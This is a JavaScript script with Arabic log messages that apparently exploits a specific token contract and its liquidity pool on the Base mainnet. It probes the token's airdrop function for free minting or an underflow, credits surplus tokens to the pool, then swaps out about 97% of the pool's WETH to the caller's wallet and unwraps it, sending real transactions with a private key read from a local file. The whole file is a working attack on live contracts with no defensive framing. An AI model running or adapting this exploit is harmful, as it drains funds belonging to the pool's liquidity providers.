import fs from "node:fs";
import { JsonRpcProvider, Wallet, keccak256, concat, zeroPadValue, toBeHex, formatUnits, formatEther } from "ethers";

const R = "https://mainnet.base.org";
const T = "0xA5a3A7a1dec1a57E41A0Cdd8c2129CfD7B46b592";
const P = "0x69249e64fd8D35036965fa09FadAEdb955D70C31";
const W = "0x4200000000000000000000000000000000000006";
const DRY = process.env.DRY === "1";

const j = async (m, pr) => (await fetch(R, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: m, params: pr }) })).json();
const pad = a => "0".repeat(24) + a.slice(2).toLowerCase();
const w32 = n => BigInt(n).toString(16).padStart(64, "0");
const slot = (a, s) => keccak256(concat([zeroPadValue(a, 32), toBeHex(s, 32)]));
const bn = async (to, data) => { const r = await j("eth_call", [{ to, data }, "latest"]); return r.error ? null : BigInt(r.result); };
const dec = d => { if (!d || !d.startsWith("0x08c379a0")) return "(بلا نص)"; try { const n = parseInt(d.slice(66, 130), 16); return Buffer.from(d.slice(130, 130 + n * 2), "hex").toString(); } catch { return "?"; } };
const sim = async (lbl, to, data, ov) => {
  const pr = [{ from: ME, to, data, gas: "0x90000" }, "latest"];
  if (ov) pr.push(ov);
  const r = await j("eth_call", pr);
  console.log((r.error ? "✗ " : "✓ ") + lbl + (r.error ? "  " + dec(r.error.data) : ""));
  return !r.error;
};

let ME;
const rv0 = async () => (await j("eth_call", [{ to: P, data: "0x0902f1ac" }, "latest"])).result;

async function main() {
  const p = new JsonRpcProvider(R, 8453, { staticNetwork: true });
  const me = new Wallet(fs.readFileSync(process.env.HOME + "/.pk", "utf8").trim(), p);
  ME = me.address;

  const base = BigInt((await j("eth_getBlockByNumber", ["latest", false])).result.baseFeePerGas);
  const mf = base * 3n / 2n + 1000000n;
  const FEE = { maxFeePerGas: mf, maxPriorityFeePerGas: 0n };
  const send = async (to, data, gas) => {
    for (let i = 0; i < 3; i++) {
      try { const rc = await (await me.sendTransaction({ to, data, gasLimit: gas, ...FEE })).wait(); if (rc.status === 1) return rc; }
      catch (e) { console.log("   خطأ:", (e.shortMessage || e.message).slice(0, 70)); }
      if (i < 2) await new Promise(r => setTimeout(r, 9000));
    }
    return null;
  };

  const rv = await rv0();
  const rW = BigInt("0x" + rv.slice(2, 66)), rS = BigInt("0x" + rv.slice(66, 130));
  const bal = await bn(T, "0x70a08231" + pad(ME));
  const balP = await bn(T, "0x70a08231" + pad(P));
  const eth = await p.getBalance(ME);
  const sur = balP > rS ? balP - rS : 0n;

  console.log("ETH:", formatEther(eth), "| SLOP:", formatUnits(bal, 9), "| WETH بالحوض:", formatEther(rW));
  console.log("baseFee:", base.toString(), "| maxFee:", mf.toString(), "| prio: 0");
  if (rW === 0n) { console.log("الحوض فارغ"); return; }

  // كمية الدخول لسحب 97% من WETH
  const tgt = rW * 97n / 100n;
  const need = rS * tgt * 1000n / (997n * (rW - tgt)) + 1n;
  const mk = amt => "0x983bc41b" + w32(0x60) + pad(ME) + w32(amt) + w32(1) + pad(P);

  console.log("\n=== السقف ===");
  let IN, drop, mode;
  if (await sim("airdrop " + formatUnits(need * 102n / 100n, 9) + " SLOP إلى الحوض", T, mk(need * 102n / 100n))) {
    IN = need * 102n / 100n; drop = mk(IN); mode = "سك مجاني — الحوض كله";
  } else if (await sim("airdrop ضعف رصيدك إلى الحوض", T, mk(bal * 2n))) {
    IN = bal * 2n; drop = mk(IN); mode = "underflow — الحوض كله";
  } else if (await sim("airdrop رصيدك إلى الحوض", T, mk(bal))) {
    IN = bal; drop = mk(IN); mode = "محدود برصيدك";
  } else { console.log("airdrop لا يمر"); return; }

  const total = sur + IN;
  const outMax = total * 997n * rW / (rS * 1000n + total * 997n);
  const out = outMax * 97n / 100n;
  console.log(">>> الوضع:", mode, "| الدخول:", formatUnits(IN, 9), "| المخرج:", formatEther(out), "WETH");

  const ov = { [T]: { stateDiff: { [slot(P, 1)]: "0x" + (balP + IN).toString(16).padStart(64, "0") } } };
  if (!await sim("swap " + formatEther(out) + " WETH إليك", P, "0x022c0d9f" + w32(0) + w32(out) + pad(ME) + w32(0x80) + w32(0), ov)) return;

  const cost = (90000n + 190000n + 50000n) * mf;
  console.log("\nتكلفة الغاز الكاملة:", formatEther(cost), "ETH | متاح:", formatEther(eth));
  if (eth < cost) { console.log("ناقص " + formatEther(cost - eth) + " ETH فقط"); return; }
  if (out < cost * 2n && mode === "محدود برصيدك") console.log("تنبيه: المخرج أقل من ضعف الغاز");
  if (DRY) { console.log("جاهز."); return; }

  console.log("\n1) ضخ SLOP في الحوض كفائض...");
  if (!await send(T, drop, 95000n)) return;
  const pNow = await bn(T, "0x70a08231" + pad(P));
  const inNow = pNow - rS;
  console.log("   فائض الحوض الآن:", formatUnits(inNow, 9));
  if (inNow <= 0n) { console.log("   لا فائض"); return; }

  const rv2 = await rv0();
  const w2 = BigInt("0x" + rv2.slice(2, 66)), s2 = BigInt("0x" + rv2.slice(66, 130));
  const o2 = (inNow * 997n * w2 / (s2 * 1000n + inNow * 997n)) * 97n / 100n;

  console.log("2) سحب", formatEther(o2), "WETH إليك...");
  if (!await send(P, "0x022c0d9f" + w32(0) + w32(o2) + pad(ME) + w32(0x80) + w32(0), 190000n)) return;

  const wb = await bn(W, "0x70a08231" + pad(ME));
  console.log("   WETH عندك:", formatEther(wb));
  if (wb > 0n) {
    console.log("3) فك إلى ETH...");
    await send(W, "0x2e1a7d4d" + w32(wb), 50000n);
  }
  console.log("\n>>> ETH عندك:", formatEther(await p.getBalance(ME)), "| WETH بالحوض:", formatEther(await bn(W, "0x70a08231" + pad(P))));
}
main().catch(e => { console.error("فشل:", e.shortMessage || e.message); process.exit(1); });
